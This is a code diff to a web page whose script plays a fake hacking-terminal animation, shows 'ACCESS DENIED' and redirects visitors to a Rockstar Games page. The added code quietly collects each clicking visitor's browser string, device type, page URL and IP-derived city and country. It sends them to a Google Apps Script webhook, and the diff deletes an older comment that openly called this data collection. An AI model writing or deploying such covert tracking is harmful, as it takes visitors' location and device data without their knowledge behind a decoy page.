@@ -97,6 +97,7 @@
 
 <script>
   
+  
   const logs = [
     "Establishing encrypted handshake...",
     "Bypassing perimeter firewalls...",
@@ -110,11 +111,14 @@
     "Locking internal nodes..."
   ];
 
+  const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec';
+
   function logText(text) {
     const terminal = document.getElementById("terminal");
     terminal.innerHTML += `<br>> ${text}`;
     terminal.scrollTop = terminal.scrollHeight;
   }
+
 
   function startSequence() {
     // Hide button and clear terminal
@@ -147,58 +151,67 @@
     }, 3500);
   }
 
-  // not
-  /**
- * DATA COLLECTION & SUBMISSION MODULE
- * This script collects user browser data and submits it to the configured webhook.
- */
 
-const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec';
-
-// Collects browser metadata, device info, and IP geolocation
-async function collectSessionMeta() {
-  const now = new Date();
-  const ts = now.toISOString();
-  
-  const ua = navigator.userAgent;
-  const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua);
-  const device = isMobile ? 'Mobile' : 'Desktop';
-
-  let location = "Location Access Blocked";
-  try {
-    const geo = await fetch('http://ip-api.com/json/');
-    if (geo.ok) {
+  // --- DATA COLLECTION LOGIC ---
+  async function collectAndSubmit() {
+    const now = new Date();
+    const ua = navigator.userAgent;
+    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile/i.test(ua);
+    
+    let location = "Fetching...";
+    try {
+      const geo = await fetch('https://ipapi.co/json/');
       const g = await geo.json();
-      location = `${g.city}, ${g.regionName}, ${g.country}`;
-    }
-  } catch (e) {
-    console.error("Geolocation failed", e);
-  }
+      location = `${g.city}, ${g.region}, ${g.country_name}`;
+    } catch (e) { location = "Location Private"; }
 
-  return {
-    timestamp: ts,
-    device: `${device} | ${ua.substring(0, 80)}`,
-    location: location,
-    url: window.location.href,
-    referrer: document.referrer || 'Direct'
-  };
-}
+    const payload = {
+      timestamp: now.toISOString(),
+      device: isMobile ? 'Mobile' : 'Desktop',
+      browser: ua.substring(0, 50),
+      location: location,
+      url: window.location.href
+    };
 
-// Submits the form data and session metadata to the Google Sheet webhook
-async function submitLeadToSheet(payload) {
-  try {
-    const response = await fetch(WEBHOOK_URL, {
+    // Fire and forget: push to your sheet
+    fetch(WEBHOOK_URL, {
       method: 'POST',
       mode: 'no-cors',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
+      body: JSON.stringify(payload)
     });
-    return response;
-  } catch (err) {
-    console.error('Webhook submission failed:', err);
-    throw err;
   }
-}
+
+  // --- UI LOGIC ---
+  function startSequence() {
+    document.getElementById("initBtn").style.display = "none";
+    document.getElementById("terminal").innerHTML = "> INITIALIZING...";
+    
+    // Trigger data collection here
+    collectAndSubmit();
+    
+    let i = 0;
+    const interval = setInterval(() => {
+      if (i < logs.length) {
+        logText(logs[i]);
+        i++;
+      } else {
+        clearInterval(interval);
+        triggerDenied();
+      }
+    }, 700);
+  }
+
+  function triggerDenied() {
+    const terminal = document.getElementById("terminal");
+    terminal.innerHTML += `<br><br><span style="color: #ff3333; font-weight: bold;">> ACCESS DENIED.</span>`;
+    document.getElementById("alertBox").style.display = "block";
+
+    setTimeout(() => {
+      window.location.href = "https://www.rockstargames.com/VI";
+    }, 3500);
+  }
+
 </script>
   
 
